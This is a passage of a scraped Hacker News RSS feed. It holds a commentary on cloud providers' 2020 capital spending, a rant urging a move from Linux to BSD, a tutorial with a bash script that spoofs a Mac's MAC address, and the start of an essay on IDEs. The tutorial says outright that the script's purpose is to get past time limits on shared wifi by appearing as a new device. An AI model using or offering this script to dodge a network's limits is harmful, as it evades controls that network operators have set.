<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-10.png"><img loading="lazy" width="858" height="504" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-10.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-10.png 858w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-10-300x176.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-10-768x451.png 768w" sizes="(max-width: 858px) 100vw, 858px"></a></figure>



<p>By most standards, Amazon had an absolutely magnificent pandemic year (some might say “bonkers”). Revenue growth nearly doubled to 38% from 20% growth the previous year, bringing in over $386 billion. Profits almost doubled. And they spent the aforementioned bonkers CAPEX to support that growth while providing an essential lifeline to hundreds of millions of people in isolation amidst a global pandemic. Not bad.</p>



<p>Amazon’s cash out of pocket for CAPEX exploded: 2020 spending was 238% of the previous year, with over $23 billion incremental spent on hard assets. Debt-funded CAPEX declined 8% (with capital leases — probably AWS servers — down 15% while the smaller sum of built-to-suit real estate leases increased as they grew their warehouse space by 50%). Over the past couple years, Amazon’s CAPEX outlay was split roughly half cash and half debt. In 2020, the cash spend ballooned to 75%. There clearly was a push to spend as much as possible on hard assets (“Quick, <a href="https://www.geekwire.com/2021/amazon-air-makes-first-outright-purchase-planes-buying-11-boeing-jets-expand-cargo-fleet/">buy as many wide-body airplanes</a> as you can before the end of the year!”).</p>



<p>Amazon has always managed for free cash flow, as opposed to profits. Despite the numbers above, the pandemic year was an all-time low when measured against their financial priorities. Even though they stuffed an additional $23 billion into CAPEX, the company was unable to reinvest most of its cash flow into the business and (embarrassingly) reported profits of over $21 billion. One could almost speculate that Bezos’ departure as CEO is not so much his choice, but reflects the board’s disappointment in his dismal 2020 cash flow performance.</p>



<p>At this point, AWS accounts for a small fraction of Amazon’s CAPEX spending, and examining overall Amazon CAPEX – except as an excuse to use the word bonkers– is ever less relevant to cloud infrastructure discussions. The finance leases historically have been the best tell on AWS cloud infrastructure investments, as they reflected server purchases.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-11.png"><img loading="lazy" width="724" height="436" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-11.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-11.png 724w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-11-300x181.png 300w" sizes="(max-width: 724px) 100vw, 724px"></a></figure>



<p>If we look at AWS revenue vs. finance leases, we can see they have decoupled, particularly in the last two years. The company probably paid cash in 2020 to convert some of its pandemic windfall into servers, and has less need to use debt to realize its CAPEX ambitions.</p>



<h2><strong>Google</strong></h2>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-12.png"><img loading="lazy" width="940" height="474" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-12.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-12.png 940w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-12-300x151.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-12-768x387.png 768w" sizes="(max-width: 940px) 100vw, 940px"></a></figure>



<p>Following Amazon last year, Google is now moving to depreciating their servers over four years:</p>



<blockquote><p>As noted in our earnings press release, we have adjusted the estimated useful lives of servers and certain network equipment starting in 2021. We expect these changes will favorably impact our 2021 operating results by approximately $2.1 billion for assets as of year-end 2020.</p></blockquote>



<p>That bold bean counter move has a multi-billion impact on their accounting earnings, but as seen by their CAPEX/revenue number, Google has been on a four-year server cycle for a long time. Yet more evidence that accounting can be distracting. CAPEX obsessives care about the gross spend on silicon, glass, steel and concrete, and don’t waste time netting out accounting abstractions like depreciation.</p>



<p>Based on that four-year cycle, we expect Google’s next CAPEX up-cycle in 2022. The company has highlighted they are investing heavily in Google Cloud, but we don’t see it in the CAPEX numbers. Even as they <a href="https://www.itprotoday.com/iaaspaas/google-expanding-google-cloud-regions-2021" data-type="URL" data-id="https://www.itprotoday.com/iaaspaas/google-expanding-google-cloud-regions-2021">expand their footprint</a> into more geographies, the infrastructure for search and YouTube are vastly larger. Google’s commentary on Google Cloud emphasizes most of that investment is in people.</p>



<p>Google (why does the Alphabet conceit still exist?) also stopped breaking out CAPEX for Other Bets this year, as Loon joined Makani and Titan in the aerial wing of the <a href="https://killedbygoogle.com/">Killed By Google</a> cemetery. Google continues to <a href="https://www.platformonomics.com/2020/07/can-brian-hall-fix-what-ails-google-cloud/">shed its Googley-ness</a> and will fail to deliver a space elevator, calling into question their entire existence and social contract compliance. I await Congressional hearings on what went wrong with the space elevator.</p>



<h2><strong>Microsoft</strong></h2>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-13.png"><img loading="lazy" width="940" height="474" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-13.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-13.png 940w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-13-300x151.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-13-768x387.png 768w" sizes="(max-width: 940px) 100vw, 940px"></a></figure>



<p>Microsoft’s CAPEX remains boring, monotonic and inscrutable, as I have not been able to tease apart their spending on Azure, Office 365 and Bing (which may be a distant number two to Google, but search still has huge infrastructure requirements to store all those copies of the entire Web). There was a brief moment of <a href="https://www.platformonomics.com/2020/10/pandemic-capex-q3-2020-update/">excitement</a> right after the pandemic broke when Microsoft was short on servers due to supply chain disruptions, but that was remedied the next quarter and boringness restored. Hopefully they can do more CAPEX-wise this year to stand out in this annual commentary.</p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->

		<!-- .entry-auhtor -->
	</article></div>]]>
            </description>
            <link>https://www.platformonomics.com/2021/02/follow-the-capex-cloud-table-stakes-2020-retrospective/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26060329</guid>
            <pubDate>Mon, 08 Feb 2021 03:08:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrate Everything from Linux to BSD]]>
            </title>
            <description>
<![CDATA[
Score 118 | Comments 153 (<a href="https://news.ycombinator.com/item?id=26060307">thread link</a>) | @zdw
<br/>
February 7, 2021 | https://www.unixsheikh.com/articles/why-you-should-migrate-everything-from-linux-to-bsd.html | <a href="https://web.archive.org/web/*/https://www.unixsheikh.com/articles/why-you-should-migrate-everything-from-linux-to-bsd.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>Published on <span id="pubdate">2020-01-18</span>. Modified on <span id="moddate">2021-02-10</span>.</p>
<p>As an operating system GNU/Linux has become a mess because of the fragmented nature of the project, the bloatware in the kernel, but mainly because of the manipulation by corporate interests. There exist <a href="https://unixsheikh.com/articles/technical-reasons-to-choose-freebsd-over-linux.html">several technical reasons</a> for when a migration from GNU/Linux to BSD make sense, but this article isn't about that, it's an "analyzes" of the current status in Linux-land, and it is an opinionated rant, more than anything else.</p>
<h3>Table of Contents</h3>
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#fragmented">Linux is fragmented</a></li>
<li><a href="#hijacked">Linux is being heavily influenced by corporate interests</a></li>
<li><a href="#bsd">BSD is the place to be</a></li>
<li><a href="#license">License problems</a></li>
<li><a href="#migrate">Time to migrate everything to BSD</a></li>
<li><a href="#links">Relevant links</a></li>
</ul>

<h2 id="introduction">Introduction</h2>
<p>In the past I have always been a favorite of choosing operating system and tools based upon technical merit. However, in today's world of companies like Microsoft, Apple, Google, and many others, compromising user privacy, and conducting controversial activities, I don't believe that to be the right cause of action.</p>
<p>Proprietary operating systems like <a href="https://en.wikipedia.org/wiki/Windows_10#Privacy_and_data_collection">Microsoft Windows 10</a>, <a href="https://gist.github.com/iosecure/357e724811fe04167332ef54e736670d">Apple MacOS</a>, and <a href="https://en.wikipedia.org/wiki/Android_%28operating_system%29#Security_and_privacy">Google Android</a> have become famous for their ill conduct, and even companies like Lenovo is using UEFI boot to inject custom Windows components, so that the system can phone home to Lenovo.</p>
<p>I have been a proponent for the open source alternatives, like GNU/Linux and BSD, for a very long time. Not only that, I also believe that the open source alternatives are much better in many technical areas.</p>
<p>I have also always been very much against <a href="https://www.unixsheikh.com/articles/the-typical-discussions-about-bsd-vs-linux.html">The typical discussions about BSD vs Linux</a>, and as I wrote in my article back then, I have always believed that the different open source projects can help each other and cooperate, and that end-users should only debate such issues from a technical stand point rather than personal preference.</p>
<p>Whenever it has been possible, I have proposed people, both private and in the industry, to change the operating systems they use to open source alternatives, and when people have been receptive to my advocacy I have helped them migrate from Microsoft Windows on their workstations to BSD or Linux. And likewise on the server side. This has been a truly successful endeavor and I have honestly never experienced a dissatisfied person or company.</p>
<p>However, things are beginning to change in the GNU/Linux world as more and more corporations want to control the direction of Linux as an operating system. Due to the structure and organization of GNU/Linux as an operating system, it is unfortunately susceptible to these influences, and while it is still open source, and still not anywhere near the bad things that is going on with the proprietary alternatives, some opt-out features have slowly been introduced into both the kernel and systemd.</p>
<p>You can still choose to opt-out of these features and go your merry way, but as an open source enthusiast and proponent, and as a privacy concerned individual, perhaps the better approach is to migrate systems to something where you don't have to concern yourself with "creepware".</p>
<p>As a system administrator I don't want to worry about whether I am going to be surprised the next time I upgrade a system, and I don't want to keep a list of spyware I have to remember to opt-out of whenever I run one of these systems.</p>
<p>Several Linux distributions have decided (not only because of privacy opt-out issues, but other issues as well) to implement <a href="https://en.wikipedia.org/wiki/Category:Linux_distributions_without_systemd">other init solutions than systemd</a>, but with the situation going on in the kernel development, and with many third party applications becoming more and dependent upon systemd, the problems are spreading to other parts of the operating system and I believe this is becoming an uphill battle.</p>
<p>From a community perspective, and from a security perspective, I don't believe the future of GNU/Linux looks very bright, and as a possible alternative solution I suggest migrating everything (when possible) to something a bit more sane, like one of the BSD projects.</p>

<h2 id="fragmented">Linux is fragmented</h2>
<p>In 1983 Richard Stallman announced his intent to start coding the GNU Project in a Usenet message. By June 1987, the project had accumulated and developed free and open source software for an assembler, an almost finished portable optimizing C compiler (GCC), an editor (GNU Emacs), and various Unix utilities, such as ls, grep, awk, make and ld.</p>
<p>In 1991, the Linux kernel appeared, developed outside the GNU project by Linus Torvalds, and in December 1992 it was made available under version 2 of the GNU General Public License. Combined with the operating system utilities already developed by the GNU project, it became the GNU/Linux operating system, better known as just "Linux".</p>
<p>Then came the Linux distributions. Different projects took the Linux kernel, the GNU tools and libraries, additional third party software, documentation, the X Window System, a window manager, and a desktop environment, and combined those components into the distributions. Different distributions focused on different goals, some put focus on the desktop while others put their main focus on servers, and again others tried to provide a multi-purpose operating system.</p>
<p>In the past all these different components and projects where developed by open source enthusiasts and communities and the passion for programming and open source was the driving force.</p>
<p>This is no longer the case! Please see <a href="https://unixsheikh.com/articles/the-real-motivation-behind-systemd.html">The real motivation behind systemd</a>.</p>
<p>Linus Torvalds has many times made it very clear that he doesn't care about what goes on in the "Linux world", all he cares about is the kernel development, and on January 6, 2020 in the "Moderated Discussions" forum at <a href="https://www.realworldtech.com/forum/?threadid=189711&amp;curpostid=189841">realworldtech.com</a>, Linus Torvalds answered a user's question, with an absolute jaw-dropping comment, about a year-old kernel maintenance controversy that heavily impacted the <a href="https://zfsonlinux.org/">ZFS on Linux</a> project.</p>
<p>After answering the user's actual question, Torvalds went on to make very wrong and damaging claims about the ZFS filesystem. Torvalds said:</p>
<blockquote>
It (ZFS) was always more of a buzzword than anything else.
</blockquote>
<p>By that statements Linus Torvalds has just reduced more that 15 years of development of one of the most robust and popular filesystems in the world into a "buzzword"!</p>
<p>ZFS is described as "The last word in filesystems". It is a combined filesystem and logical volume manager originally designed by Sun Microsystems. ZFS is a stable, fast, secure, and future-proof filesystem. It is scalable, and includes extensive protection against data corruption, support for high storage capacities, a maximum 16 Exabyte file size, and a maximum 256 Quadrillion Zettabytes storage with no limit on number of filesystems (datasets) or files, efficient data compression, snapshots and copy-on-write clones, continuous integrity checking and automatic repair, RAID-Z, native NFSv4 ACLs, and can be very precisely configured.</p>
<p>The two main implementations, by Oracle and by the <a href="https://en.wikipedia.org/wiki/OpenZFS">OpenZFS</a> project, are extremely similar, making ZFS widely available within Unix-like systems.</p>
<p>As mentioned in the Wikipedia article, OpenZFS is an umbrella project aimed at bringing together individuals and companies that use the ZFS file system and work on its improvements, aiming as well at making ZFS more widely used and developed in an open-source manner. OpenZFS brings together developers from the illumos, Linux, FreeBSD, and macOS platforms, and a wide range of companies. High-level goals of the project include raising awareness of the quality, utility and availability of open-source implementations of ZFS, encouraging open communication about ongoing efforts toward improving open-source variants of ZFS, and ensuring consistent reliability, functionality and performance of all distributions of ZFS.</p>
<p><a href="https://github.com/zfsonlinux/zfs/commits/master">OpenZFS on Linux</a>, which is the Linux part of the project, has currently 345 active contributors with more that 5.600 commits, and commits are being made on an almost daily basis!</p>
<p>Some of the worlds biggest CDN and data storage services runs ZFS on either FreeBSD or Linux!</p>
<p>In another situation Linus Torvalds gave an interview on <a href="https://www.youtube.com/watch?v=mysM-V5h9z8">TFiR: open source and Emerging Tech YouTube channel</a> about Linux on the desktop in which he makes another amazing statement saying that Linux still isn't ready for the desktop and that perhaps <a href="https://en.wikipedia.org/wiki/Chrome_OS">Chrome OS</a> is the solution to that problem.</p>
<p>These and many other statements by Linus Torvalds show that Linux as an operating system has no real direction and no clear management because the kernel development is performed in isolation from the rest of the Linux world.</p>
<p>Linus Torvalds is generally also very open to the rapid influence by corporate interests and his perspective on security is also worrying.</p>
<p>In 2009 Linus Torvalds admitted that the kernel development is getting out of control.</p>
<blockquote>
We're getting bloated and huge. Yes, it's a problem ... Uh, I'd love to say we have a plan ... I mean, sometimes it's a bit sad that we are definitely not the streamlined, small, hyper-efficient kernel that I envisioned 15 years ago ... The kernel is huge and bloated, and our icache footprint is scary. I mean, there is no question about that. And whenever we add a new feature, it only gets worse.
</blockquote>
<p>At LinuxCon 2014, he said that he thinks the bloat situation is better because modern PCs are a lot faster!</p>
<blockquote>
We've been bloating the kernel over the last 20 years, but hardware has grown faster.
</blockquote>
<p>This is a very problematic attitude.</p>
<p>When software gets bloated it not only becomes more insecure and more error prone, but it also becomes much slower. Thinking that the problem goes away because hardware becomes faster is an immature attitude. In this day and age we need to optimize software so that less power is required, we need to save power and limit pollution.</p>
<p>In a 2007 interview "Why I quit": kernel developer Con Kolivas he stated:</p>
<blockquote>
If there is any one big problem with kernel development and Linux it is the complete disconnection of the development process from normal users. You know, the ones who constitute 99.9% of the Linux user base. The Linux kernel mailing list is the …</blockquote></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.unixsheikh.com/articles/why-you-should-migrate-everything-from-linux-to-bsd.html">https://www.unixsheikh.com/articles/why-you-should-migrate-everything-from-linux-to-bsd.html</a></em></p>]]>
            </description>
            <link>https://www.unixsheikh.com/articles/why-you-should-migrate-everything-from-linux-to-bsd.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26060307</guid>
            <pubDate>Mon, 08 Feb 2021 03:02:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Change your MAC address with a shell script (2019)]]>
            </title>
            <description>
<![CDATA[
Score 184 | Comments 100 (<a href="https://news.ycombinator.com/item?id=26060152">thread link</a>) | @mooreds
<br/>
February 7, 2021 | https://josh.works/shell-script-basics-change-mac-address | <a href="https://web.archive.org/web/*/https://josh.works/shell-script-basics-change-mac-address">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  

  <time datetime="2019-12-18T13:00:00+00:00">December 2019</time>
  <section>
    
    <!-- https://planetjekyll.github.io/snippets/reading-time -->
<p>
  
  
    Reading time: 8 mins
  
</p>

  </section>
  
  
  <h2>Article Table of Contents</h2>
<ul>
  <li><a href="#get-your-current-mac-address">Get your current MAC address</a></li>
  <li><a href="#figure-out-which-adapter-your-machine-is-using-to-connect-to-the-wifi">Figure out which adapter your machine is using to connect to the wifi</a></li>
  <li><a href="#generate-a-random-new-mac-address">Generate a random new MAC address</a></li>
  <li><a href="#set-current-mac-address-to-temporarynew-mac-address">Set current mac address to temporary/new MAC address</a></li>
  <li><a href="#feb-9-2021-update">Feb 9, 2021 update</a></li>
  <li><a href="#related-reading">Related Reading</a></li>
</ul>
  <p>For a while, I’ve had notes from <a href="https://www.online-tech-tips.com/computer-tips/how-to-change-mac-address/">Change or Spoof a MAC Address in Windows or OS X</a> saved, so if I am using a wifi connection that limits me to thirty minutes or an hour, I can “spoof” a new MAC address, and when I re-connect to the wifi, the Access Point thinks I’m on a new, unique device.</p>

<p>For the record - when I’m posted up at a coffee shop for an extended period of time, I make sure to <em>buy products regularly</em> in payment for my time. So, if you’re spoofing your MAC address to use wifi for a longer period of time, maybe make sure to spend $5 or $10 when you run the script.</p>

<p>Now, in case you think that I’m actually saving myself time here, I’m totally not. Here’s why:</p>

<p><img src="https://imgs.xkcd.com/comics/automation.png" alt="XKCD Automation" title="'Automating' comes from the roots 'auto-' meaning 'self-', and 'mating', meaning 'screwing'."></p>

<p><em><a href="https://xkcd.com/1319/">XKCD: Automation</a></em></p>

<p>And:</p>

<p><img src="https://imgs.xkcd.com/comics/is_it_worth_the_time.png" alt="XKCD Is it worth the time?" title="Don't forget the time you spend finding the chart to look up what you save. And the time spent reading this reminder about the time spent. And the time trying to figure out if either of those actually make sense. Remember, every second counts toward your life total, including these right now."></p>

<p><em><a href="https://xkcd.com/1205/">XKCD: Is it worth the time?</a></em></p>

<p>Here’s the steps, for someone who’s on a MAC, to spoof your MAC address:</p>
      <h3 id="get-your-current-mac-address">
        
        
          Get your current MAC address <a href="#get-your-current-mac-address">#</a>
        
        
      </h3>
    

<p>Hold down <code>option</code> key, click your wifi icon:</p>

<p><img src="https://josh.works/images/2019-12-11-bash-basics-01.jpg" alt="wifi details"></p>
      <h3 id="figure-out-which-adapter-your-machine-is-using-to-connect-to-the-wifi">
        
        
          Figure out which adapter your machine is using to connect to the wifi <a href="#figure-out-which-adapter-your-machine-is-using-to-connect-to-the-wifi">#</a>
        
        
      </h3>
    

<div><div><pre><code>ifconfig en0 | <span>grep </span>ether <span># one of these will return a MAC address that matches</span>
ifconfig en1 | <span>grep </span>ether <span># the value you saw when looking for your current</span>
ifconfig en2 | <span>grep </span>ether <span># mac address.</span>
ifconfig en3 | <span>grep </span>ether <span># Keep incrementing the `en0` value until you run out of </span>
                          <span># devices</span>
</code></pre></div></div>

<p>Here’s me working through the list:</p>

<p><img src="https://josh.works/images/2019-12-11-basic-bash-02.jpg" alt="checking all ports"></p>

<p>For me, the very first result matched the MAC address I got from <code>option+click</code>ing the wifi network.</p>

<p>That means I’ll be using <code>en0</code> as the [E]ther[N]et adapter I’ll update shortly.</p>

<!--more-->
      <h3 id="generate-a-random-new-mac-address">
        
        
          Generate a random new MAC address <a href="#generate-a-random-new-mac-address">#</a>
        
        
      </h3>
    

<p>A MAC address has a standard-looking format.</p>

<p>It looks like six blocks of two digits, which happen to be <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal representations</a> of <code>00000000</code> through <code>11111111</code>.</p>

<p>Here’s some randomly-generated MAC addresses:</p>

<div><div><pre><code>e2:81:f6:f6:f9:e8
1f:24:37:47:d6:25
03:20:3f:48:46:ad
</code></pre></div></div>

<p>To generate a random string of characters that produces a <a href="http://sqa.fyicenter.com/1000208_MAC_Address_Validator.html">valid MAC address</a>, run:</p>

<div><div><pre><code>openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
</code></pre></div></div>

<p>And boom. You’ve got a MAC address.</p>

<p>Now we need to update our current MAC address to this new MAC address.</p>
      <h3 id="set-current-mac-address-to-temporarynew-mac-address">
        
        
          Set current mac address to temporary/new MAC address <a href="#set-current-mac-address-to-temporarynew-mac-address">#</a>
        
        
      </h3>
    

<p>You can use <code>ifconfig</code> to set the ethernet address (is that interchangable with the MAC address?) to the randomly-generated string you got from the <code>openssl</code> command:</p>

<div><div><pre><code><span># you need to sudo it, unfortunately. No quotes around the mac address</span>
<span>sudo </span>ifconfig en0 ether xx:xx:xx:xx:xx:xx

<span># here's the full command</span>
<span>sudo </span>ifconfig en0 ether 8c:85:90:5a:79:56
</code></pre></div></div>

<p>And with that, you can re-connect to the wifi network, and it <em>should</em> recognize you as a new device, and let you onto the network.</p>

<p>Here’s what I first ended up with:</p>

<div><div><pre><code><span>#!/bin/bash</span>

<span>echo</span> <span>"Hi! lets change our mac address."</span>
<span>echo</span> <span>"Step 1: hold down option key, click wifi logo. Note the mac address"</span>
<span>echo</span> <span>"Step 2: click 'disconnect from network' "</span>
<span>echo</span> <span>"Step 3: note which ethernet adapter lines up with the mac address you just saw"</span>

<span>en0</span><span>=</span><span>$(</span> ifconfig en0 | <span>grep </span>ether <span>)</span>
<span>en1</span><span>=</span><span>$(</span> ifconfig en1 | <span>grep </span>ether <span>)</span>
<span>en2</span><span>=</span><span>$(</span> ifconfig en2 | <span>grep </span>ether <span>)</span>
<span>en3</span><span>=</span><span>$(</span> ifconfig en3 | <span>grep </span>ether <span>)</span>
<span>en4</span><span>=</span><span>$(</span> ifconfig en4 | <span>grep </span>ether <span>)</span>
<span>en5</span><span>=</span><span>$(</span> ifconfig en5 | <span>grep </span>ether <span>)</span>

<span>echo </span>en0 is: <span>$en0</span>
<span>echo </span>en1 is: <span>$en1</span>
<span>echo </span>en2 is: <span>$en2</span>
<span>echo </span>en3 is: <span>$en3</span>
<span>echo </span>en4 is: <span>$en4</span>
<span>echo </span>en5 is: <span>$en5</span>

<span>read</span> <span>-p</span> <span>'Step 4: Enter which ethernet device lined up with the given mac address: '</span> ether_adapter
<span>export </span><span>ether_adapter</span><span>=</span><span>$ether_adapter</span>

<span>mac</span><span>=</span><span>$(</span> openssl rand <span>-hex</span> 6 | <span>sed</span> <span>"s/</span><span>\(</span><span>..</span><span>\)</span><span>/</span><span>\1</span><span>:/g; s/.</span><span>$/</span><span>/"</span> <span>)</span>
<span>export </span><span>mac</span><span>=</span><span>$mac</span>

<span>echo</span> <span>"btw, here's the new mac address we're going to use: </span><span>$mac</span><span>"</span>
<span>echo</span> <span>"OK, we will change the mac address associated with: </span><span>$ether_adapter</span><span>"</span>

<span>old_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>

<span>echo</span> <span>"The old value was: </span><span>$old_mac</span><span>"</span>

<span>sudo </span>ifconfig <span>$ether_adapter</span> ether <span>$mac</span>

<span>new_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>

<span>echo</span> <span>"The new value is: </span><span>$new_mac</span><span>"</span>
<span>echo</span> <span>"go ahead and re-connect to the wifi. You should be able to join the network."</span>
</code></pre></div></div>

<p>Believe it or not, this script was far from perfect.</p>

<p>First off, not all randomly-generated mac addresses are valid, even though they were passing an online mac address validator I was testing against. <a href="https://askubuntu.com/a/536221">AskUbuntu</a> nicely shared what was going on.</p>

<p>I didn’t want to deal with manually building a valid MAC address; I just noticed that about 2 out of 3 attempts to change my mac address, using the above script, the MAC address didn’t change.</p>

<p>So, my next version of this script pulls the <code>generate mac address</code> and <code>set current mac address to generated mac address</code> steps into a function, and keeps calling the function until the mac address has changed.</p>

<p>Why be elegant and precise when you can brute force a crappy solution?</p>

<p>Here’s my finished “solution”:</p>

<div><div><pre><code><span>#!/bin/bash</span>
<span># skipping some lines</span>
<span>read</span> <span>-p</span> <span>'Step 4: Which device lined up would you like to change? (hit return for en0) '</span> ether_adapter

<span>if</span> <span>[</span> <span>-z</span> <span>$ether_adapter</span> <span>]</span>
<span>then
  </span><span>ether_adapter</span><span>=</span><span>"en0"</span>
<span>fi

</span><span>export </span><span>ether_adapter</span><span>=</span><span>$ether_adapter</span>

generate_and_set_new_mac_address<span>()</span> <span>{</span>
  <span>mac</span><span>=</span><span>$(</span> openssl rand <span>-hex</span> 6 | <span>sed</span> <span>"s/</span><span>\(</span><span>..</span><span>\)</span><span>/</span><span>\1</span><span>:/g; s/./0/2; s/.</span><span>$/</span><span>/"</span><span>)</span>
  <span>export </span><span>mac</span><span>=</span><span>$mac</span>
  <span>echo</span> <span>"OK, we will change the mac address associated with: </span><span>$ether_adapter</span><span>"</span>

  <span>old_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>

  <span>echo</span> <span>"The old value was: </span><span>$old_mac</span><span>"</span>
  <span>sudo </span>ifconfig <span>$ether_adapter</span> ether <span>$mac</span>

  <span>new_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>
  <span>echo</span> <span>"The new value is: </span><span>$new_mac</span><span>"</span>
<span>}</span>
<span>echo</span> <span>$new_mac</span>
<span>echo</span> <span>$old_mac</span>

<span>while</span> <span>[</span> <span>"</span><span>$new_mac</span><span>"</span> <span>==</span> <span>"</span><span>$old_mac</span><span>"</span> <span>]</span>
<span>do
  </span><span>echo</span> <span>"not the same"</span>
  generate_and_set_new_mac_address
<span>done

</span><span>echo</span> <span>"go ahead and re-connect to the wifi. You should be able to join the network."</span>
</code></pre></div></div>

<p>and this seems to work pretty well:</p>

<p><img src="https://josh.works/images/2019-12-17-bash_script_success.jpg" alt="success"></p>

<p>I hope that in the near future, I’ll look at this bash script and have many ways to improve it. For now, it’ll do the trick.</p>
      <h3 id="feb-9-2021-update">
        
        
          Feb 9, 2021 update <a href="#feb-9-2021-update">#</a>
        
        
      </h3>
    

<p>Following <a href="https://twitter.com/serent/status/1359208380435361792">this tweet</a> by <code>@serent</code>, I updated the script a little. To generate a valid MAC address:</p>

<div><div><pre><code><span>@@ -160,7 +162,7 @@</span> fi
 export ether_adapter=$ether_adapter

 generate_and_set_new_mac_address() {
<span>-  mac=$( openssl rand -hex 6 | sed "s/\(..\)/\1:/g; s/.$//" )
</span><span>+  mac=$( openssl rand -hex 6 | sed "s/\(..\)/\1:/g; s/./0/2; s/.$//")
</span>   export mac=$mac
   echo "OK, we will change the mac address associated with: $ether_adapter"
</code></pre></div></div>

<p>There’s other pain points in the script. I’ll fix them at some point.</p>
      
    

<ul>
  <li><a href="https://news.ycombinator.com/item?id=26060152#26060229">Hacker News comments from 2021 on this post</a></li>
  <li><a href="https://ryanstutorials.net/bash-scripting-tutorial/bash-script.php">Bash Scripting Tutorial</a></li>
  <li><a href="https://www.online-tech-tips.com/computer-tips/how-to-change-mac-address/">Change or Spoof a MAC Address in Windows or OS X</a></li>
  <li><a href="https://stackoverflow.com/questions/13781216/meaning-of-too-many-arguments-error-from-if-square-brackets">Resolution to <code>[: too many arguments</code> error</a></li>
  <li><a href="https://askubuntu.com/questions/423530/cant-change-my-mac-address-cant-assign-requested-address/536221">AskUbuntu: “Can’t change my mac address - can’t assign requested address”</a></li>
</ul>
  

</article></div>]]>
            </description>
            <link>https://josh.works/shell-script-basics-change-mac-address</link>
            <guid isPermaLink="false">hacker-news-small-sites-26060152</guid>
            <pubDate>Mon, 08 Feb 2021 02:28:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why an IDE?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26060145">thread link</a>) | @O_H_E
<br/>
February 7, 2021 | https://matklad.github.io/2020/11/11/yde.html | <a href="https://web.archive.org/web/*/https://matklad.github.io/2020/11/11/yde.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Nov 11, 2020</p>
  <p>Some time ago I wrote a reddit comment explaining the benefits of IDEs.
Folks refer to it from time to time, so I decided to edit it into an article form.
Enjoy!</p>
<p>I think I have a rather balanced perspective on IDEs.
I used to be a heavy Emacs user (<a href="https://github.com/matklad/.emacs.d/tree/475de5db99f8729c57fed7e6fde4cd06f5ccb62f">old config</a>, <a href="https://github.com/matklad/config/blob/d555642a5a9e4e8b0ca0c77f188ffd976f06327c/home/.emacs.d/init.el">current config</a>).
I worked at JetBrains on <a href="https://github.com/intellij-rust/intellij-rust">IntelliJ Rust</a> for several years.
I used evil mode and vim for a bit, and tried tmux and kakoune.
Nowadays, I primarily use VS Code to develop <a href="https://github.com/rust-analyzer/rust-analyzer/">rust-analyzer</a>: LSP-based editor-independent IDE backend for Rust.</p>
<p>I will be focusing on IntelliJ family of IDEs, as I believe these are the most advanced IDEs today.</p>
<p>The main distinguishing feature of IntelliJ is semantic understanding of code.
The core of IntelliJ is a compiler which parses, type checks and otherwise understands your code.
<a href="https://martinfowler.com/bliki/PostIntelliJ.html">PostIntelliJ</a> is the canonical post about this.
That article also refutes the claim that “Smalltalk IDE is the best we’ve ever had”.</p>
<p>Note that “semantic understanding” is mostly unrelated to the traditional interpretation of “IDE” as <em>Integrated</em> Development Environment.
I personally don’t feel that the “Integrated” bit is all that important.
I commit&amp;push from the command line using Julia scripts, rebase in magit, and do code reviews in a browser.
If anything, there’s an ample room for improvement for the integration bits.
For me, <strong>I</strong> in “<strong>I</strong>DE” stands for “intelligent”, smart.</p>
<p>Keep in mind this terminology difference.
I feel it is a common source of misunderstanding.
“Unix and command line can do anything an IDE can do” is correct about integrated bits, but is wrong about semantical bits.</p>
<p>Traditional editors like Vim or Emacs understand programming languages very approximately, mostly via regular expressions.
For me, this feels very wrong.
It’s <a href="https://stackoverflow.com/a/1732454">common knowledge</a> that HTML shall not be parsed with regex.
Yet this is exactly what happens every time one does <code>vim index.html</code> with syntax highlighting on.
I sincerely think that almost every syntax highlighter out there is wrong and we, as an industry, should do better.
I also understand that this is a tall order, but I do my best to change the status quo here :-)</p>
<p>These are mostly theoretical concerns though.
The question is, does semantic understanding help in practice?
I am pretty sure that it is non-essential, especially for smaller code bases.
My <a href="https://github.com/matklad/rustraytracer">first non-trivial Rust program</a> was written in Emacs, and it was fine.
